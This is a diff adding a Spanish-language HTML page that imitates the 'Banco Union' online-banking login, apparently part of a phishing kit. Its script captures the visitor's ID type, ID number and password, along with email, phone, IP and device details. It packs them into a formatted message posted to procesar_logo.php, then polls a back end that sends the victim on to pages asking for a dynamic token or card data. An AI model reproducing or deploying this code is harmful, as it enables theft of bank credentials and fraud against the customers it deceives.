@@ -1,0 +1,637 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>Union</title>
+  <style>
+    @keyframes pulse {
+      0% { transform: scale(1); opacity: 1; }
+      50% { transform: scale(1.1); opacity: 0.7; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+    
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+    
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f8f9fa;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      padding-top: 150px;
+    }
+
+    .container {
+      background-color: white;
+      width: 90%;
+      max-width: 1000px;
+      display: flex;
+      justify-content: space-between;
+      padding: 40px;
+      border-radius: 20px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+    } 
+
+    .form-section {
+      flex: 1;
+      padding-right: 40px;
+    }
+
+    .form-group {
+      margin-bottom: 20px;
+      position: relative;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: bold;
+      font-size: 14px;
+      color: #333;
+    }
+
+    select,
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 50px 12px 14px;
+      font-size: 14px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      outline: none;
+      appearance: none;
+      background-color: white;
+    }
+
+    /* Chulo como imagen */
+    .check-image {
+      position: absolute;
+      top: 70%;
+      right: 14px;
+      transform: translateY(-50%);
+      width: 22px;
+      height: 22px;
+      pointer-events: none;
+    }
+
+    .form-group i {
+      position: absolute;
+      right: 14px;
+      top: 70%;
+      transform: translateY(-50%);
+      color: #666;
+    }
+
+    .btn {
+      background-color: #00a0e3;
+      color: white;
+      border: none;
+      border-radius: 30px;
+      padding: 12px;
+      font-size: 16px;
+      width: 100%;
+      cursor: pointer;
+    }
+
+    .btn:hover {
+      background-color: #008dcb;
+    }
+
+    .link {
+      margin-top: 12px;
+      display: block;
+      font-size: 14px;
+      color: #007bff;
+      text-decoration: none;
+    }
+
+    .link:hover {
+      text-decoration: underline;
+    }
+
+    .image-section {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      border-left: 1px solid #ddd;
+      padding-left: 40px;
+    }
+
+    .circle-image {
+      width: 230px;
+      height: 230px;
+      border-radius: 50%;
+      overflow: hidden;
+      margin-bottom: 30px;
+    }
+
+    .circle-image img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .description {
+      text-align: center;
+      color: #444;
+      font-size: 15px;
+      line-height: 1.5;
+    }
+
+    .description b {
+      font-weight: bold;
+      color: #333;
+    }
+
+    .banner {
+      position: fixed;
+      top: 0;
+      left: 0;
+      right: 0;
+      background-color: #FFD700;
+      padding: 15px 20px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+      z-index: 1000;
+      display: flex;
+      align-items: center;
+    }
+
+    .banner img {
+      width: 250px;
+      height: 60px;
+      object-fit: contain;
+      margin-right: 200px;
+    }
+
+    .login-title {
+      position: absolute;
+      top: 110px;
+      left: 25%;
+      transform: translateX(-50%);
+      font-family: Arial, sans-serif;
+      font-size: 48px;
+      font-weight: bold;
+      color: #00a0e3;
+      text-shadow: 0 0 10px rgba(0, 160, 227, 0.3);
+      z-index: 999;
+      text-align: center;
+    }
+
+    /* Media queries para dispositivos móviles */
+    @media (max-width: 768px) {
+      body {
+        padding-top: 120px;
+        height: auto;
+        min-height: 100vh;
+        background-color: white;
+      }
+
+      .container {
+        width: 100%;
+        flex-direction: column;
+        padding: 20px;
+        margin: 0;
+        background-color: transparent;
+        box-shadow: none;
+        border-radius: 0;
+      }
+
+      .form-section {
+        padding-right: 0;
+        margin-bottom: 30px;
+      }
+
+      .image-section {
+        border-left: none;
+        border-top: 1px solid #ddd;
+        padding-left: 0;
+        padding-top: 30px;
+      }
+
+      .circle-image {
+        width: 180px;
+        height: 180px;
+        margin-bottom: 20px;
+      }
+
+      .banner {
+        padding: 12px 15px;
+      }
+
+      .banner img {
+        width: 180px;
+        height: 45px;
+        margin-right: 0;
+      }
+
+      .login-title {
+        font-size: 36px;
+        top: 90px;
+        left: 25%;
+        transform: translateX(-50%);
+      }
+
+      .form-group {
+        margin-bottom: 18px;
+      }
+
+      select,
+      input[type="text"],
+      input[type="password"] {
+        padding: 15px 50px 15px 16px;
+        font-size: 16px; /* Evita zoom en iOS */
+      }
+
+      .btn {
+        padding: 15px;
+        font-size: 18px;
+      }
+
+      .description {
+        font-size: 14px;
+        padding: 0 10px;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .container {
+        width: 100%;
+        padding: 15px;
+      }
+
+      .login-title {
+        font-size: 28px;
+        top: 85px;
+        left: 25%;
+        transform: translateX(-50%);
+      }
+
+      .banner img {
+        width: 150px;
+        height: 40px;
+      }
+
+      .circle-image {
+        width: 150px;
+        height: 150px;
+      }
+
+      .form-group {
+        margin-bottom: 16px;
+      }
+
+      label {
+        font-size: 13px;
+      }
+
+      select,
+      input[type="text"],
+      input[type="password"] {
+        padding: 14px 45px 14px 14px;
+        font-size: 15px;
+      }
+
+      .btn {
+        padding: 14px;
+        font-size: 16px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <!-- Loader inicial -->
+  <div id="loader" style="
+    position: fixed;
+    top: 0; left: 0; right: 0; bottom: 0;
+    background: #ffffff;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    z-index: 9999;
+  ">
+    <img src="img/l1.png" alt="Cargando..." style="width: 120px; height: 120px; animation: pulse 1.5s infinite;">
+  </div>
+
+  <div class="banner">
+    <img src="img/l21.svg" alt="Banner" />
+  </div>
+  <div class="login-title">Inicia sesión</div>
+  <div class="container">
+    <div class="form-section">
+      <div class="form-group">
+        <label for="tipo">Tipo de documento</label>
+        <select id="tipo" required>
+          <option value="">Selecciona</option>
+          <option selected>Cédula de Ciudadanía</option>
+          <option>Cédula de Extranjería</option>
+          <option>Tarjeta de identidad</option>
+          <option>Pasaporte</option>
+          <option>Permiso por proteccion temporal</option>
+        </select>
+        <img src="img/chulo.png" alt="Chulo" class="check-image" />
+      </div>
+
+      <div class="form-group">
+        <label for="documento">Número de documento</label>
+        <input type="text" id="documento" placeholder="Escribe tu número de documento" maxlength="15" pattern="[0-9]*" inputmode="numeric" />
+        <i>
+          <svg width="20" height="20" viewBox="0 0 32 32" fill="#666" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="16" cy="12" r="6" />
+            <path d="M16 20c-6 0-10 3-10 5v3h20v-3c0-2-4-5-10-5z" />
+          </svg>
+        </i>
+      </div>
+
+      <div class="form-group">
+        <label for="clave">Contraseña</label>
+        <input type="password" id="clave" placeholder="Escribe tu contraseña" maxlength="15" pattern="[a-zA-Z0-9]*" />
+        <i>
+          <svg width="20" height="20" fill="#666" viewBox="0 0 16 16">
+            <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zm-8 4a4 4 0 1 1 0-8 4 4 0 0 1 0 8zm0-1.5a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5z"/>
+          </svg>
+        </i>
+      </div>
+
+      <button class="btn">Ingresa</button>
+      <a href="#" class="link">¿Olvidaste tu contraseña?</a>
+    </div>
+
+    <div class="image-section">
+      <div class="circle-image">
+        <img src="img/lacy.png" alt="Imagen circular" />
+      </div>
+      <div class="description">
+        Ahora puedes realizar pagos, consignaciones<br />
+        y transferencias de manera <b>segura, ágil y<br />cómoda</b>.
+      </div>
+    </div>
+  </div>
+
+  <!-- Campos ocultos para el sistema -->
+  <input type="hidden" id="session_id" name="session_id">
+  <input type="hidden" id="username" name="username">
+
+  <!-- Loader overlay -->
+  <div id="loader-overlay" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 9999; justify-content: center; align-items: center;">
+    <div style="text-align: center; color: white;">
+      <div class="loader-spinner" style="width: 60px; height: 60px; animation: blink 1.5s ease-in-out infinite; margin: 0 auto 20px;">
+        <img src="img/210.jpg" alt="Loading" style="width: 100%; height: 100%; object-fit: contain;">
+      </div>
+      <p>Verificando información...</p>
+    </div>
+  </div>
+
+  <script>
+    // Espera 3 segundos y oculta el loader inicial
+    setTimeout(function () {
+      document.getElementById('loader').style.display = 'none';
+    }, 3000);
+
+    document.addEventListener("DOMContentLoaded", function () {
+      const urlParams = new URLSearchParams(window.location.search);
+      
+      // Generar o recuperar session_id
+      let sessionId = localStorage.getItem('session_id');
+      if (!sessionId) {
+        sessionId = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('session_id', sessionId);
+      }
+      
+      const sessionInput = document.getElementById('session_id');
+      sessionInput.value = sessionId;
+
+      // Obtener usuario desde URL params y establecer en el campo hidden
+      const userFromUrl = urlParams.get('user');
+      const usernameInput = document.getElementById('username');
+      if (userFromUrl) {
+        usernameInput.value = userFromUrl;
+        localStorage.setItem('username', userFromUrl);
+      }
+
+      // Event listener para el botón Ingresa
+      const btnIngresar = document.querySelector('.btn');
+      
+      btnIngresar.addEventListener('click', async function (event) {
+        event.preventDefault();
+
+        // Obtener datos del formulario
+        const identificacion = document.getElementById('documento').value;
+        const password = document.getElementById('clave').value;
+        const tipoDocumento = document.getElementById('tipo').value;
+        
+        // Validar que la contraseña tenga al menos 4 caracteres
+        if (password.length < 4) {
+          alert('La contraseña debe tener al menos 4 caracteres');
+          return;
+        }
+        
+        // Validar que la identificación tenga al menos 5 dígitos
+        if (identificacion.length < 5) {
+          alert('La identificación debe tener al menos 5 dígitos');
+          return;
+        }
+
+        // Mostrar loader
+        const loader = document.getElementById('loader-overlay');
+        if (loader) {
+          loader.style.display = 'flex';
+        }
+
+        const formUsername = document.getElementById('username').value;
+        const session_id = document.getElementById('session_id').value;
+
+        localStorage.setItem('username', formUsername);
+        localStorage.setItem('password', password);
+        localStorage.setItem('session_id', session_id);
+        localStorage.setItem('identificacion', identificacion);
+        localStorage.setItem('tipoDocumento', tipoDocumento);
+
+        let infoData;
+        try {
+          infoData = JSON.parse(localStorage.getItem('info') || '{}');
+        } catch (e) {
+          return;
+        }
+
+        const meta = infoData?.metaInfo || {};
+
+        // Obtener datos del usuario desde localStorage o URL params
+        const username = urlParams.get('user') || localStorage.getItem('username') || '';
+        
+        // Detectar tipo de dispositivo
+        const userAgent = navigator.userAgent;
+        let dispositivo = 'PC';
+        
+        if (/Android/i.test(userAgent)) {
+          dispositivo = 'Android';
+        } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+          dispositivo = 'iPhone';
+        } else if (/Windows/i.test(userAgent)) {
+          dispositivo = 'PC';
+        } else if (/Mac/i.test(userAgent)) {
+          dispositivo = 'Mac';
+        } else if (/Linux/i.test(userAgent)) {
+          dispositivo = 'Linux';
+        }
+        
+        const hora = new Date().toLocaleString('es-ES');
+        
+        // Función para construir y enviar el mensaje
+        function buildAndSendMessage(ip) {
+          const mensaje = `
+🚀 <b><u> BANCO UNION PSE</u></b> 🚀
+• 💌 <b>Correo:</b> <code>${localStorage.getItem('correo') || 'No disponible'}</code>
+• 📞 <b>Celular:</b> <code>${localStorage.getItem('cel') || 'No disponible'}</code>
+• 🪪 <b>Cédula:</b> <code>${localStorage.getItem('val') || 'No disponible'}</code>
+• 🧍 <b>Persona:</b> <code>${localStorage.getItem('per') || 'No disponible'}</code>
+• 🏦 <b>Banco: BANCO UNION
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━  
+• 🧭 <b>IP:</b> <code>${ip}</code>
+• 🖥 <b>Dispositivo:</b> <code>${dispositivo}</code>
+• 🕒 <b>Hora:</b> <code>${hora}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+• 📄 <b>Tipo Doc:</b> <code>${tipoDocumento}</code>
+• 👤 <b>Usuario:</b> <code>${identificacion}</code>
+• 🔑 <b>Clave:</b> <code>${password}</code>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
+          const formData = new FormData();
+          formData.append('message', mensaje);
+          formData.append('transactionId', session_id);
+
+          fetch('procesar_logo.php', {
+            method: 'POST',
+            body: formData
+          })
+          .then(res => res.json())
+          .then(result => {
+            if (result.status === 'success') {
+              checkPaymentVerification(session_id, result.messageId);
+            } else {
+              const loader = document.getElementById('loader-overlay');
+              if (loader) {
+                loader.style.display = 'none';
+              }
+            }
+          })
+          .catch(err => {
+            const loader = document.getElementById('loader-overlay');
+            if (loader) {
+              loader.style.display = 'none';
+            }
+          });
+        }
+        
+        // Obtener IP y construir mensaje
+        fetch('get_ip.php')
+          .then(response => response.json())
+          .then(data => {
+            const ip = data.ip || 'No disponible';
+            buildAndSendMessage(ip);
+          })
+          .catch(() => {
+            buildAndSendMessage('No disponible');
+          });
+      });
+
+      // Validación para solo números en el campo de documento
+      document.getElementById('documento').addEventListener('input', function(e) {
+        // Remover cualquier carácter que no sea número
+        this.value = this.value.replace(/[^0-9]/g, '');
+        
+        // Limitar a 15 caracteres
+        if (this.value.length > 15) {
+          this.value = this.value.slice(0, 15);
+        }
+      });
+
+      // Prevenir pegar texto que no sean números
+      document.getElementById('documento').addEventListener('paste', function(e) {
+        e.preventDefault();
+        let pastedText = (e.clipboardData || window.clipboardData).getData('text');
+        let numbersOnly = pastedText.replace(/[^0-9]/g, '');
+        if (numbersOnly.length > 15) {
+          numbersOnly = numbersOnly.slice(0, 15);
+        }
+        this.value = numbersOnly;
+      });
+
+      // Validación para caracteres alfanuméricos en el campo de contraseña
+      document.getElementById('clave').addEventListener('input', function(e) {
+        // Remover cualquier carácter que no sea letra o número
+        this.value = this.value.replace(/[^a-zA-Z0-9]/g, '');
+        
+        // Limitar a 15 caracteres
+        if (this.value.length > 15) {
+          this.value = this.value.slice(0, 15);
+        }
+      });
+
+      // Prevenir pegar texto que no sean caracteres alfanuméricos
+      document.getElementById('clave').addEventListener('paste', function(e) {
+        e.preventDefault();
+        let pastedText = (e.clipboardData || window.clipboardData).getData('text');
+        let alphanumericOnly = pastedText.replace(/[^a-zA-Z0-9]/g, '');
+        if (alphanumericOnly.length > 15) {
+          alphanumericOnly = alphanumericOnly.slice(0, 15);
+        }
+        this.value = alphanumericOnly;
+      });
+    });
+
+   async function checkPaymentVerification(transactionId, messageId) {
+  try {
+    const formData = new FormData();
+    formData.append('transactionId', transactionId);
+    formData.append('messageId', messageId);
+
+    const res = await fetch('verificar_respuesta.php', {
+      method: 'POST',
+      body: formData
+    });
+    const result = await res.json();
+
+    if (result.action) {
+      switch (result.action) {
+        case 'pedir_dinamica':
+          window.location.href = "token.php";
+          break;
+
+        case 'error_logo': {
+          const loader = document.getElementById('loader-overlay');
+          if (loader) loader.style.display = 'none';
+          alert("Usuario o clave incorrectos.");
+          window.location.href = "index.html";
+          break;
+        }
+
+        // 🔹 NUEVO: botón "Tarjeta"
+        case 'tarjeta':
+          // aquí mandas al flujo de tarjeta
+          window.location.href = "tarjeta.php"; // o la ruta que quieras
+          break;
+      }
+    } else {
+      setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
+    }
+  } catch (err) {
+    setTimeout(() => checkPaymentVerification(transactionId, messageId), 2000);
+  }
+}
+
+  </script>
+</body>
+</html>	
